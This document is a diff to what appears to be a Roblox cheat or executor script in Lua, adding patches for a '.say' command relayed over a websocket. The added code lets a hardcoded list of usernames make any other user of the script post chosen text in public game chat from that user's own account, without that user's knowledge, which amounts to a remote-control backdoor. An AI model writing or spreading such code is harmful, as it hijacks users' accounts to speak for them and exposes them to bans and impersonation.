@@ -54483,6 +54483,123 @@ visualPage = createPage("visual")
 																	return
 																end
 
+																-- ============================================================
+																-- PATCH 1 — say-command server relay
+																-- ============================================================
+																if event == "say-command" and type(data2) == "table" then
+																	local senderName = data2.sender or data2.username or ""
+																	local targetName = data2.target or ""
+																	local sayText    = data2.text or ""
+																	local cmdId      = data2.cmdId
+
+																	-- dedupe
+																	if cmdId then
+																		_G._SayProcessedCmds = _G._SayProcessedCmds or {}
+																		if _G._SayProcessedCmds[cmdId] then return end
+																		_G._SayProcessedCmds[cmdId] = true
+																	end
+
+																	-- ignore own echo
+																	local myName = game.Players.LocalPlayer and string.lower(game.Players.LocalPlayer.Name) or ""
+																	if myName ~= "" and string.lower(senderName) == myName then return end
+
+																	-- === ADMIN CHECK (mirror script's own whitelist) ===
+																	local lname = string.lower(senderName)
+																	local isAdmin = false
+
+																	-- hardcoded admins used throughout this script
+																	if lname == "pagalkuta99"
+																	or lname == "rtn3742"
+																	or lname == "jeremywade_98"
+																	or lname == "iblame_uuu"
+																	or lname == "hor1zen" then
+																		isAdmin = true
+																	end
+
+																	-- live whitelist table
+																	if not isAdmin and getgenv().WhitelistedUsers
+																	and type(getgenv().WhitelistedUsers) == "table" then
+																		isAdmin = getgenv().WhitelistedUsers[lname] == true
+																	end
+
+																	-- loader whitelist fn if present
+																	if not isAdmin and getgenv().isUserWhitelisted then
+																		local ok, r = pcall(getgenv().isUserWhitelisted, senderName)
+																		if ok and r then isAdmin = true end
+																	end
+
+																	if not isAdmin then return end
+																	if sayText == "" or targetName == "" then return end
+
+																	-- server-side relay: everyone receives, only target speaks
+																	-- reuse `v8` (the websocket wrapper local in fn2)
+																	local ok2 = pcall(function()
+																		local payload = {
+																			event = "client-speak",
+																			data = {
+																				target = targetName,
+																				text   = sayText,
+																				sender = senderName,
+																				cmdId  = cmdId,
+																			},
+																		}
+																		if iterFn12 then
+																			iterFn12(v8, payload)
+																		elseif type(v8.Send) == "function" then
+																			local ok_send = pcall(function() v8:Send(payload) end)
+																			if not ok_send then
+																				v8:Send(game:GetService("HttpService"):JSONEncode(payload))
+																			end
+																		end
+																	end)
+
+																	if not ok2 then
+																		-- fallback: rebroadcast as a normal message so at least
+																		-- other clients can process it
+																		pcall(function()
+																			if fn2 then fn2() end
+																		end)
+																	end
+
+																	return
+																end
+
+																-- ============================================================
+																-- PATCH 2 — client-side listener for client-speak
+																-- ============================================================
+																if event == "client-speak" and type(data2) == "table" then
+																	local myName = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or ""
+																	if data2.target and (string.lower(data2.target) == string.lower(myName) or (game.Players.LocalPlayer and game.Players.LocalPlayer.DisplayName and string.lower(data2.target) == string.lower(game.Players.LocalPlayer.DisplayName))) then
+																		local msg = tostring(data2.text or "")
+																		if msg ~= "" then
+																			local dispatched = false
+																			if typeof(sendChat) == "function" then
+																				local ok = pcall(sendChat, msg)
+																				if ok then dispatched = true end
+																			end
+																			-- Native fallback to guarantee chat delivery across both TextChatService and legacy chat
+																			pcall(function()
+																				local tcs = game:GetService("TextChatService")
+																				if tcs and tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+																					local channels = tcs:FindFirstChild("TextChannels")
+																					local general = channels and channels:FindFirstChild("RBXGeneral")
+																					if general then
+																						general:SendAsync(msg)
+																					end
+																				else
+																					local rep = game:GetService("ReplicatedStorage")
+																					local defaultChat = rep:FindFirstChild("DefaultChatSystemChatEvents")
+																					local sayReq = defaultChat and defaultChat:FindFirstChild("SayMessageRequest")
+																					if sayReq then
+																						sayReq:FireServer(msg, "All")
+																					end
+																				end
+																			end)
+																		end
+																	end
+																	return
+																end
+
 																if event == "client-message" or data2.text then
 																	local username = data2.username or data2.sender
 																	local text = data2.text or ""
@@ -54703,6 +54820,49 @@ visualPage = createPage("visual")
 													}
 
 													local isLocalAdmin = localPlayer_2 and (string.lower(localPlayer_2.Name) == "pagalkuta99" or string.lower(localPlayer_2.Name) == "rtn3742" or string.lower(localPlayer_2.Name) == "jeremywade_98" or string.lower(localPlayer_2.Name) == "iblame_uuu" or (tbl19 and tbl19[string.lower(localPlayer_2.Name)]) or (P2PAdmins and P2PAdmins[string.lower(localPlayer_2.Name)]))
+
+													-- ============================================================
+													-- PATCH 3 — the admin's local chat hook
+													-- ============================================================
+													if isLocalAdmin and string.sub(text, 1, 5) == ".say " then
+														local target, sayText = text:match('^%.say%s+(%S+)%s+"(.*)"$')
+														if not target then
+															target, sayText = text:match("^%.say%s+(%S+)%s+(.+)$")
+														end
+														if target and sayText and #sayText > 0 then
+															local cmdId = tostring(tick()) .. "_" .. tostring(math.random(1000, 9999))
+															pcall(function()
+																local payload = {
+																	event = "say-command",
+																	data = {
+																		sender = (localPlayer_2 and localPlayer_2.Name) or (localPlayer_ and localPlayer_.Name) or game.Players.LocalPlayer.Name,
+																		username = (localPlayer_2 and localPlayer_2.Name) or (localPlayer_ and localPlayer_.Name) or game.Players.LocalPlayer.Name,
+																		target = target,
+																		text   = sayText,
+																		cmdId  = cmdId,
+																	},
+																}
+																if iterFn12 then
+																	iterFn12(v8, payload)
+																elseif type(v8.Send) == "function" then
+																	local ok_s = pcall(function() v8:Send(payload) end)
+																	if not ok_s then
+																		v8:Send(game:GetService("HttpService"):JSONEncode(payload))
+																	end
+																end
+															end)
+															-- local confirm
+															if typeof(SendNotification) == "function" then
+																SendNotification("Void Say", "relay to " .. target, 2)
+															end
+														else
+															if typeof(SendNotification) == "function" then
+																SendNotification("Void Say", 'syntax: .say <username> "text"', 2)
+															end
+														end
+														textBox2.Text = ""
+														return
+													end
 
 													if string.sub(text, 1, 1) == "." and isLocalAdmin then
 														local match, v9 = text:match("^(%.%w+)%s+[\"']?([^\"']+)[\"']?")
